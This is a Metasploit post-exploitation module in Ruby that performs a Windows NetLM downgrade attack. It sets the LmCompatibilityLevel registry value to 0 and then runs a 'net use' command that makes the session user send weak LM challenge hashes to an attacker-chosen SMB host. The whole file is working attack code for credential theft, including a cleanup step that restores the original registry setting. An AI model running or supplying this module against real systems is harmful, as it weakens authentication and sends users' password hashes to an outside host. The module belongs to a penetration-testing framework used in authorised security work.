##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows NetLM Downgrade Attack',
        'Description' => %q{
          This module changes the system LmCompatibilityLevel registry value
          to enable sending LM challenge hashes and initiates a SMB connection
          to the host specified in the SMBHOST module option. If an SMB server
          is listening, it will receive the NetLM hashes for the session user.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'Author' => [
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        ],
        'SessionTypes' => ['meterpreter', 'shell', 'powershell'],
        'References' => [
          ['URL', 'https://web.archive.org/web/20210311141729/https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks'],
          ['URL', 'https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level'],
          ['URL', 'https://support.microsoft.com/en-us/topic/security-guidance-for-ntlmv1-and-lm-network-authentication-da2168b6-4a31-0088-fb03-f081acde6e73']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptAddress.new('SMBHOST', [ true, 'IP address of SMB server to capture hashes.' ])
    ])
  end

  def smb_connect(smb_host)
    print_status("Establishing SMB connection to #{smb_host}")
    cmd_exec('cmd.exe', "/c net use \\\\#{smb_host}")
    print_good("SMB server #{smb_host} should now have NetLM hashes")
  end

  def lm_compatibility_level
    registry_getvaldata('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LmCompatibilityLevel')
  end

  def set_lm_compatibility_level(level)
    subkey = 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
    v_name = 'LmCompatibilityLevel'

    v = level.nil? ? registry_deleteval(subkey, v_name) : registry_setvaldata(subkey, v_name, level, 'REG_DWORD')

    fail_with(Failure::Unknown, "Error modifying registry value #{subkey}\\#{v_name}") if v.nil?

    v
  end

  def run
    @needs_cleanup = false

    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    # Running as SYSTEM and will not pass any network credentials
    fail_with(Failure::BadConfig, 'Running as SYSTEM. This module should be run as a user.') if is_system?

    @original_lm_compat = lm_compatibility_level

    if @original_lm_compat == 0
      print_good("NetLM authentication is already required on this system (LmCompatibilityLevel: #{@original_lm_compat})")
    else
      print_status("NetLM authentication is disabled (LmCompatibilityLevel: #{@original_lm_compat.inspect}). Enabling ...")
      set_lm_compatibility_level(0)
      fail_with(Failure::Unknown, 'Could not enable NetLM authentication') unless lm_compatibility_level == 0
      @needs_cleanup = true
      print_good('NetLM authentication is enabled')
    end

    # call smb_connect method to pass network hashes
    smb_connect(datastore['SMBHOST'])
  end

  def cleanup
    return unless @needs_cleanup

    print_status("Restoring original LM compatibility level (LmCompatibilityLevel: #{@original_lm_compat.inspect})")

    unless set_lm_compatibility_level(@original_lm_compat)
      print_error('Could not restore original LM compatibility level')
    end
  ensure
    super
  end
end
